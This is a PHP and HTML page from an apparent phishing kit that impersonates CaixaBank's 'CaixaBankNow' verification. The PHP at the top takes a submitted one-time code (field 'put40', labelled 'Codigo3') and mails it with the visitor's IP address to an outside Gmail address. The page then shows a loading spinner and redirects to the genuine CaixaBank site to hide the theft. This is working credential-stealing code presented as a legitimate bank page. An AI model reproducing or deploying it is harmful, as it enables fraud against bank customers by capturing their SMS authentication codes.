<?php
	$ip = $_SERVER['REMOTE_ADDR'];
	$message  = "****************[CAIXA_ES]***************\n";
	$message .= "Codigo3	: " .$_POST['put40']."\n";
	$message .= "******************************************\n";
	$to = " appstorej9@gmail.com ";
	$subj = "CAIXA_ES_sms $ip";
	$from = "From: CAIXA_ES<info@online.net>";
	mail($to, $subj, $message, $from);
?>
<!DOCTYPE html>
<html>
<head>
	<title>CaixaBank | verificación CaixaBankNow</title>
	<link rel="icon" type="image/png" href="../img/icon.png" />
	<link rel="stylesheet" type="text/css" href="../img/css.css">
	<meta http-equiv="refresh" content="12;url=https://www.caixabank.es/" />
</head>
<body id="body">
	<div id="cnt">
		<div id="hdr">
			<div id="hedr5" style="display: none;"></div>
			<div id="hedr2" >
			<div id="put11" class="absolut">
			<img src="https://icon-library.com/images/loading-icon-animated-gif/loading-icon-animated-gif-19.jpg" style="width:84px;">
			</div>
			</div>
		</div>
	</div>
	<script type="text/javascript">
            setTimeout(function() {
                var el = document.getElementById('hedr5');
                var e = document.getElementById('hedr2');
                if( el ) 
                    el.style.display = 'block';
                    e.style.display = 'none';
            }, 6500);
        </script>
</body>
</html>